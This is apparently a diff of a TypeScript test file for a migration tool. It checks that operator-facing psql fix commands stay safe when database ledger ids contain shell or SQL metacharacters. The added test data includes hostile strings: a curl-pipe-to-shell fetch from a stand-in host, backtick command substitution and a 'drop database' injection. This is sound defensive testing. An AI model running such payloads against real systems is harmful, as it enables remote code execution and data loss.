@@ -58,9 +58,14 @@ describe('migrate', () => {
     expect(error.cause).toContain('applied by app version "1.6.0"');
     expect(error.cause).toContain('this build is "1.5.0"');
     // Not `x db status --json`: that subcommand has never existed, and this is one of the two
-    // errors most likely to fire during a real deploy.
-    expect(error.fix).toContain('deploy app version "1.6.0"');
+    // errors most likely to fire during a real deploy. The version is named in the CAUSE and not
+    // in the command — the fix's job is to be runnable, and a version is not a thing you run.
+    expect(error.fix).toContain('deploy the app version this error names');
     expect(error.fix).toContain('psql "$DATABASE_URL"');
+    // base64 of `20260202000000_from_the_future`, decoded by Postgres rather than spliced as text.
+    expect(error.fix).toContain(
+      `convert_from(decode('${Buffer.from('20260202000000_from_the_future', 'utf8').toString('base64')}', 'base64'), 'UTF8')`,
+    );
 
     // Nothing ran: no BEGIN, no user DDL, no ledger insert.
     expect(client.texts.some((text) => text.includes('create table "posts"'))).toBe(false);
@@ -352,10 +357,74 @@ describe('auditLedger refuses a migration this build does not ship', () => {
     expect(error.cause).toContain('20260202000000_deleted');
     // The version moved into the cause; it is still the fact an operator acts on.
     expect(error.cause).toContain('"dev"');
-    expect(error.fix).toContain("delete from x_migrations where id = '20260202000000_deleted'");
+    expect(error.fix).toContain('delete from x_migrations where id = convert_from(decode(');
   });
 
   test('a ledger this build ships in full still passes', () => {
     expect(() => auditLedger([ledgerRow()], [addPosts], 'dev')).not.toThrow();
+  });
+
+  // Both values are the DATABASE's: whoever can write a ledger row picks the text that lands in a
+  // line this file's own comment says is copied and run verbatim, and `psql "$DATABASE_URL" -c
+  // "…"` puts it inside SHELL DOUBLE QUOTES, where `$(…)` and a backtick substitute before psql
+  // is reached at all. The id therefore does not go in as TEXT: it goes in base64, whose alphabet
+  // (`A-Za-z0-9+/=`) is inert in shell double quotes and in a SQL string literal alike. Every id
+  // below produces the same command shape, which is the point — the previous screen degraded the
+  // whole line to prose, so a row could take the operator's one instruction away by holding a
+  // space.
+  const HOSTILE_IDS = [
+    '$(curl -s evil.sh|sh)',
+    '`id`',
+    "20260202_a'b",
+    '20260202"; drop database x; --',
+    'has a space',
+    'back\\slash',
+  ];
+
+  for (const id of HOSTILE_IDS) {
+    test(`a ledger id of ${JSON.stringify(id)} still yields a runnable command`, () => {
+      const hostile = ledgerRow({ id, app_version: '`id`' });
+      let thrown: unknown;
+      try {
+        auditLedger([hostile], [addPosts], 'dev');
+      } catch (error) {
+        thrown = error;
+      }
+
+      const error = thrown as { code: string; cause: string; fix: string };
+      expect(error.code).toBe('X_MIGRATION_CONFLICT');
+      // The id is still reported verbatim — the cause is prose nobody pastes.
+      expect(error.cause).toContain(id);
+      // The command survives, and the SQL it carries — everything inside `-c "…"`, which is the
+      // only part the ledger row can reach — holds nothing a shell expands or that would close the
+      // literal it sits in. `$DATABASE_URL` is the shape's own and is outside this slice.
+      expect(error.fix).toContain('psql "$DATABASE_URL" -c "');
+      const statement = error.fix.slice(error.fix.indexOf('-c "') + 4, -1);
+      expect(statement).not.toMatch(/[$`\\"]/);
+      // The `'` characters are exactly the six the shape itself writes — around the base64 payload
+      // and around the two format names — never one the id contributed.
+      expect(statement.split("'")).toHaveLength(7);
+      // And the payload really is this id: Postgres decodes it back before comparing.
+      const encoded = Buffer.from(id, 'utf8').toString('base64');
+      expect(statement).toContain(`convert_from(decode('${encoded}', 'base64'), 'UTF8')`);
+      expect(Buffer.from(encoded, 'base64').toString('utf8')).toBe(id);
+    });
+  }
+
+  // The app version is the OTHER value the database picks, and it is no longer in the command at
+  // all: the cause names it, which is where a human reads it, and a version is not a thing anyone
+  // runs. It carried a backtick here for that reason.
+  test('the app version is reported in the cause and never spliced into the command', () => {
+    const hostile = ledgerRow({ id: '20260202000000_deleted', app_version: '`id`' });
+    let thrown: unknown;
+    try {
+      auditLedger([hostile], [addPosts], 'dev');
+    } catch (error) {
+      thrown = error;
+    }
+
+    const error = thrown as { cause: string; fix: string };
+    expect(error.cause).toContain('`id`');
+    expect(error.fix).not.toContain('`');
   });
 });
